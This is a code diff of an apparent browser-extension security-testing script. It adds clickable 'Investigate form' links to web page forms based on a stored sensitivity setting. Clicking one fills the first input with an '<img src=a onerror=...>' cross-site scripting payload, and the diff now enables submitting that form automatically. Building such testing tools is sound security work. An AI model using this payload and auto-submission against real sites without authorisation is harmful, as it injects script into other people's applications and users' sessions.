@@ -4,41 +4,53 @@ function ignoreerror() {
 }
 window.onerror = ignoreerror();
 
-// On page load, analyse any pre-existing forms and add in
-// an "Investigate form" button to attempt an attack.
 // TODO: at the moment this only attempts a specific XSS
 window.addEventListener("load", function() {
+
+  chrome.storage.local.get(function(storage) {
+    var sensitivity = storage["settings"]["sensitivity"];
+    addRecommendationsToPage(sensitivity);
+  });
+
+}, false);
+
+// This adds the "Investigate form" inputs to the page
+// as per the set sensitivity
+function addRecommendationsToPage(sensitivity) {
   // Inject "Investigate Form" buttons on input
   var forms = document.getElementsByTagName("form");
-  for (var i = 0; i < forms.length; i++) {
-    var currForm = forms[i];
-    var inputs = currForm.getElementsByTagName("input");
-    if (!inputs.length)
-      continue;
-    var firstInputChild = inputs[0];
 
-    var recommendation = document.createElement('a');
-    recommendation.classList.add("recommendation");
-    var text = document.createTextNode("Investigate form");
-    recommendation.appendChild(text);
-    // Make it look clickable
-    recommendation.setAttribute("href", "javascript:void(0)");
+  if (sensitivity === "1") {
+    for (var i = 0; i < forms.length; i++) {
+      var currForm = forms[i];
+      var inputs = currForm.getElementsByTagName("input");
+      if (!inputs.length)
+        continue;
+      var firstInputChild = inputs[0];
 
-    recommendation.child = firstInputChild;
-    recommendation.form = currForm;
+      var recommendation = document.createElement('a');
+      recommendation.classList.add("recommendation");
+      var text = document.createTextNode("Investigate form");
+      recommendation.appendChild(text);
+      // Make it look clickable
+      recommendation.setAttribute("href", "javascript:void(0)");
 
-    // Attempt XSS (or otherwise) upon clicking the form
-    recommendation.addEventListener('click', function(evt) {
-      attemptXSS(evt.target.child, evt.target.form);
-    });
+      recommendation.child = firstInputChild;
+      recommendation.form = currForm;
 
-    // Create new div wrapper for element to be next to input
-    var newParent = document.createElement("div");
-    newParent.appendChild(firstInputChild);
-    newParent.appendChild(recommendation);
-    currForm.insertBefore(newParent, currForm.firstChild);
+      // Attempt XSS (or otherwise) upon clicking the form
+      recommendation.addEventListener('click', function(evt) {
+        attemptXSS(evt.target.child, evt.target.form);
+      });
+
+      // Create new div wrapper for element to be next to input
+      var newParent = document.createElement("div");
+      newParent.appendChild(firstInputChild);
+      newParent.appendChild(recommendation);
+      currForm.insertBefore(newParent, currForm.firstChild);
+    }
   }
-}, false);
+}
 
 // This method attempts an XSS attack by using an exploit string,
 // adding it as input to the page
@@ -57,6 +69,6 @@ function attemptXSS(inputElement, parentForm) {
   inputElement.value = "<img src=a onerror=\"" + jsExploitStr + "')\">";
 
   // Submit form
-  // parentForm.submit();
+  parentForm.submit();
 }
 
